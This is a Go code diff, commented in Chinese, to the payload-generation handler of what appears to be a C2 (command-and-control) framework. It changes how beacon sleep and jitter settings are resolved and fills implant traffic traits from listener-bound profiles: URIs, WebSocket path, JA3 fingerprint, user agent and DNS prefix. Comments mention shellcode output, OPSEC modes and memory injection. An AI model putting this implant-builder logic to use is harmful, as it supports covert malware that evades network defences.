@@ -15,7 +15,6 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"strconv"
 	"strings"
 	"unicode/utf16"
 
@@ -155,9 +154,10 @@ func GenServer(c *gin.Context) {
 	// 优先使用前端传递的密钥参数，否则从数据库获取
 	var masterKey, encryptionSalt []byte
 
-	// 获取监听器的心跳配置
-	heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(connectAddress, listenerType)
-	logx.Debugf("🔍 [SERVER-GEN] 获取监听器心跳配置 - 超时次数: %s, 间隔: %s秒\n", heartbeatTimeout, heartbeatInterval)
+	// 监听器级 beacon 配置（sleep/jitter）：-1 = 未配置，由 payload 层继续回落到
+	// 绑定画像的 sleeptime_ms / 全局 client.sleep/jitter。
+	beaconCfg := database.GetListenerBeaconConfigByAddr(connectAddress, listenerType)
+	logx.Debugf("🔍 [SERVER-GEN] 监听器 beacon 配置 - sleep=%d秒, jitter=%d%% (-1=继承)\n", beaconCfg.SleepSeconds, beaconCfg.JitterPercent)
 
 	if serverBody.Vkey != "" && serverBody.EncryptSalt != "" {
 		// 使用前端传递的密钥参数（不打印完整密钥到日志）
@@ -274,12 +274,6 @@ func GenServer(c *gin.Context) {
 		return
 	}
 
-	// 抖动百分比：配置文件 client.jitter（默认 20）
-	jitterStr := "20"
-	if g := config.GetGlobalConfig(); g != nil && g.Client.Jitter >= 0 && g.Client.Jitter <= 50 {
-		jitterStr = strconv.Itoa(g.Client.Jitter)
-	}
-
 	// 【P2-3】统一占位符 patch 引擎（与 WebDelivery 共用 delivery.PatchClientBinary，
 	// 含 PASS/主密钥/盐/心跳/抖动/HOST 占位符替换，替换失败即拒绝生成——
 	// 原 GenServer 内联替换三处重复实现已合并，含 6KB OSS 占位符字面量）
@@ -293,10 +287,22 @@ func GenServer(c *gin.Context) {
 	}
 	// quietMode 已由 resolveOpsec 归一化（含服务端 opsec 配置回落），不再就地取默认值。
 	// C2 Profile 驱动：URI/WS 路径/心跳基准/UA（profiles/*.yaml，空 profile 用客户端默认）
-	prof := c2profile.Get(serverBody.ProfileName)
-	// 未知名画像：Get 返回 nil，下面的 patch 会写入空 URI 生成一个连不上的载荷，直接拒绝
-	if prof == nil && serverBody.ProfileName != "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "C2 Profile 不存在: " + serverBody.ProfileName})
+	// 前端目前不发送 profileName：空值必须按**该监听器实际绑定的画像**回落，
+	// 否则绑定非 default 画像的监听器会被下面的 profileListenerMismatch 误拒（400）。
+	profileName := strings.TrimSpace(serverBody.ProfileName)
+	if profileName == "" {
+		profileName = listenerProfileNameForPayload(serverBody.Listener)
+	}
+	prof := c2profile.Get(profileName)
+	if prof == nil && strings.TrimSpace(serverBody.ProfileName) == "" {
+		// 自动回落的画像文件缺失（监听器绑定的画像被删）：沿用升级前的行为回落到
+		// default（监听器启动时同样按 default 特征注册），不因历史脏数据阻断生成。
+		profileName = c2profile.DefaultProfileName
+		prof = c2profile.GetDefault()
+	}
+	// 显式请求了不存在的画像：下面的 patch 会写入空 URI 生成一个连不上的载荷，直接拒绝
+	if prof == nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "C2 Profile 不存在: " + profileName})
 		return
 	}
 	// 一致性校验：载荷的画像必须与该监听器**实际注册**的画像一致。
@@ -349,7 +355,8 @@ func GenServer(c *gin.Context) {
 		Pass:                serverBody.Pass,
 		VKey:                serverBody.Vkey,
 		EncryptSalt:         serverBody.EncryptSalt,
-		JitterPercent:       jitterStr,
+		// JitterPercent / SleepSeconds 留空：由 delivery.PatchClientBinary 统一按
+		// 监听器 > 画像 > 全局的优先级解析（与监听器列表"生效值"共用同一套逻辑）。
 		ReconnectBaseDelay:  serverBody.ReconnectBaseDelay,
 		ReconnectMaxRetries: serverBody.ReconnectMaxRetries,
 		InjectTechDefault:   ops.InjectTech,
@@ -384,7 +391,14 @@ func GenServer(c *gin.Context) {
 		return
 	}
 
-	logx.Infof("❤️ [SERVER-GEN] 已将监听器心跳配置应用到客户端 - 间隔: %s秒, 超时: %s次, 抖动: %s%%\n", heartbeatInterval, heartbeatTimeout, jitterStr)
+	// 日志记录最终生效值（与真正 patch 进载荷的一致）
+	profileSleepMs := 0
+	if prof != nil && prof.SleeptimeMs > 0 {
+		profileSleepMs = prof.SleeptimeMs
+	}
+	effSleep := delivery.ResolveBeaconSleep("", beaconCfg.SleepSeconds, profileSleepMs)
+	effJitter := delivery.ResolveBeaconJitter("", beaconCfg.JitterPercent)
+	logx.Infof("❤️ [SERVER-GEN] beacon 配置 - sleep=%d秒, jitter=%d%%（监听器未配置时继承画像/全局）\n", effSleep, effJitter)
 
 	// bin/hex/c：无阶段 shellcode（完整客户端经 donut 转换，运行即上线，无需分阶段拉取）
 	if isShellcodeFmt {
@@ -681,23 +695,76 @@ func boolToOnOff(b bool) string {
 // 入参是前端传来的 "protocol://address"。查不到监听器（比如地址填的是重定向器/域前置，
 // 库里没有这条记录）时回落 default —— 与升级前的行为一致，且不会因此拒绝生成载荷。
 func listenerProfileForPayload(listenerSpec string) *c2profile.Profile {
+	name := listenerProfileNameForPayload(listenerSpec)
+	if p := c2profile.Get(name); p != nil {
+		return p
+	}
+	return c2profile.GetDefault()
+}
+
+// applyListenerProfile 用监听器绑定的画像补齐 PatchOptions 中未显式提供的流量特征。
+//
+// WebDelivery / 内存注入 / 会话迁移原先只传密钥与地址，载荷会按 default 路径去连
+// 一个按其他画像注册的监听器（URI/WS 路径/DNS 前缀对不上），永远不上线。
+// 显式值优先，空值才填；画像字段本身为空时保持空，让 delivery 用内置默认。
+func applyListenerProfile(opts *delivery.PatchOptions, listenerSpec string) {
+	applyProfileFields(opts, listenerProfileForPayload(listenerSpec))
+}
+
+// applyListenerProfileRecord 同上，但直接使用已查到的监听器记录（调用方已按客户端
+// 归属定位，派生连接地址可能与库中 connect_address 不完全一致）。
+func applyListenerProfileRecord(opts *delivery.PatchOptions, l database.Listener) {
+	if _, p := resolveListenerProfile(l.Profile); p != nil {
+		applyProfileFields(opts, p)
+	}
+}
+
+func applyProfileFields(opts *delivery.PatchOptions, prof *c2profile.Profile) {
+	if prof == nil {
+		return
+	}
+	if opts.HTTPGetURI == "" {
+		opts.HTTPGetURI = prof.HTTP.Get.URI
+	}
+	if opts.HTTPPostURI == "" {
+		opts.HTTPPostURI = prof.HTTP.Post.URI
+	}
+	if opts.WSPath == "" {
+		opts.WSPath = prof.WS.Path
+	}
+	if opts.TLSJA3 == "" {
+		opts.TLSJA3 = prof.TLS.JA3
+	}
+	if opts.UserAgent == "" {
+		opts.UserAgent = prof.UserAgent
+	}
+	if opts.DNSLabelPrefix == "" && prof.DNS.BeaconPrefix != "" {
+		opts.DNSLabelPrefix = sanitizeMasquerade(prof.DNS.BeaconPrefix)
+	}
+	if opts.MetadataChannel == "" {
+		opts.MetadataChannel = prof.HTTP.Get.MetadataChannel
+	}
+	if opts.Padding == "" {
+		opts.Padding = boolToOnOff(prof.HTTP.Get.Padding)
+	}
+}
+
+// listenerProfileNameForPayload 返回该监听器绑定的画像名（查不到/空地址回落 default）。
+// 生成载荷时用于"前端没传 profileName"的回落，保证画像一致性校验的基准与监听器一致。
+func listenerProfileNameForPayload(listenerSpec string) string {
 	addr := listenerSpec
 	if i := strings.Index(addr, "://"); i >= 0 {
 		addr = addr[i+3:]
 	}
 	if addr == "" {
-		return c2profile.GetDefault()
+		return c2profile.DefaultProfileName
 	}
-	var lis database.Listener
 	lis, has, err := database.Listeners().FindByConnectOrListen(addr)
 	if err != nil || !has {
-		return c2profile.GetDefault()
+		return c2profile.DefaultProfileName
 	}
-	_, p := resolveListenerProfile(lis.Profile)
-	if p == nil {
-		return c2profile.GetDefault()
-	}
-	return p
+	name, _ := resolveListenerProfile(lis.Profile)
+	return name
 }
 
 // profileListenerMismatch 检查画像与**该监听器实际注册**的流量特征是否一致（一致返回空串）。
